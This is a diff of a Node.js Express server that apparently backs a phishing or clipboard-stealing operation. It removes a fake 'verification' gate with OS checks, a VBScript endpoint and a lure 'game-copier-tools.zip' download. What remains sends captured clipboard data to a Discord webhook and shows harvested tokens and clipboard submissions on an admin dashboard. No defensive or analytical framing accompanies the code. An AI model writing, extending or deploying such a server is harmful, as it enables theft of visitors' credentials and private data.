@@ -4,17 +4,10 @@ const fs = require('fs');
 const path = require('path');
 const bodyParser = require('body-parser');
 const https = require('https');
-const crypto = require('crypto');
-const cookieParser = require('cookie-parser');
-
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Session verification storage
-const sessionVerification = {}; // sessionId: { verified: bool, os: 'windows'|'other' }
-
 app.use(bodyParser.json());
-app.use(cookieParser());
 app.use(express.static('public'));
 app.set('view engine', 'html');
 app.engine('html', require('ejs').renderFile);
@@ -27,15 +20,6 @@ function getRealIP(req) {
          req.socket.remoteAddress ||
          (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
          req.ip;
-}
-
-// Utility for session IDs
-function getSessionId(req) {
-  // Try to get from header, fallback to cookie, fallback to query
-  return req.headers['x-session-id'] ||
-         req.cookies?.sessionId ||
-         req.query.sessionId ||
-         req.body?.sessionId;
 }
 
 // Function to send data to Discord webhook
@@ -97,54 +81,6 @@ function sendToDiscord(data, type = 'clipboard') {
   req.write(payload);
   req.end();
 }
-
-// VERIFICATION SYSTEM ENDPOINTS
-
-// Endpoint: Check verification status
-app.get('/verification-status', (req, res) => {
-  const sessionId = getSessionId(req);
-  if (!sessionId) return res.json({ verified: false });
-  res.json({ verified: !!(sessionVerification[sessionId]?.verified) });
-});
-
-// Endpoint: Mark session as verified
-app.post('/verify-session', (req, res) => {
-  const sessionId = getSessionId(req);
-  const { os } = req.body;
-  if (!sessionId) return res.status(400).json({ error: 'No session' });
-  if (!sessionVerification[sessionId]) sessionVerification[sessionId] = {};
-  sessionVerification[sessionId].verified = true;
-  sessionVerification[sessionId].os = os || 'unknown';
-  res.json({ ok: true });
-});
-
-// Endpoint: Serve /verifyaccept as VBScript
-app.get('/verifyaccept', (req, res) => {
-  res.type('text/vbscript');
-  res.send('MsgBox "ACCEPTED"\nwindow.close');
-});
-
-// Endpoint: Download (gated)
-app.get('/download', (req, res) => {
-  const sessionId = getSessionId(req);
-  if (!sessionId || !sessionVerification[sessionId]?.verified) {
-    return res.status(401).send('Not verified');
-  }
-  // Serve a real file here
-  res.attachment('game-copier-tools.zip');
-  res.send('Here are your requested game copier tools!\n');
-});
-
-// Serve /verify and /verifynotwindows pages
-app.get('/verify', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'verify.html'));
-});
-
-app.get('/verifynotwindows', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'verifynotwindows.html'));
-});
-
-// EXISTING ENDPOINTS
 
 // Get user IP endpoint
 app.get('/get-ip', (req, res) => {
@@ -328,12 +264,6 @@ app.get('/admin', (req, res) => {
     ? fs.readFileSync(tokensPath, 'utf8') 
     : 'No tokens yet.';
   
-  // Get verification status summary
-  const verificationSummary = Object.keys(sessionVerification).map(sessionId => {
-    const session = sessionVerification[sessionId];
-    return `Session: ${sessionId.substring(0, 8)}... | Verified: ${session.verified} | OS: ${session.os || 'unknown'}`;
-  }).join('\n') || 'No verification sessions yet.';
-  
   const adminHTML = `
   <!DOCTYPE html>
   <html>
@@ -348,11 +278,6 @@ app.get('/admin', (req, res) => {
   </head>
   <body>
     <h1>Admin Dashboard</h1>
-    
-    <div class="section">
-      <h2>Verification Sessions</h2>
-      <pre>${verificationSummary}</pre>
-    </div>
     
     <div class="section">
       <h2>Clipboard Submissions</h2>
@@ -376,8 +301,7 @@ app.listen(PORT, () => {
   const dirs = [
     path.join(__dirname, 'data'),
     path.join(__dirname, 'data', 'clipboard'),
-    path.join(__dirname, 'data', 'tokens'),
-    path.join(__dirname, 'public')
+    path.join(__dirname, 'data', 'tokens')
   ];
   
   dirs.forEach(dir => {
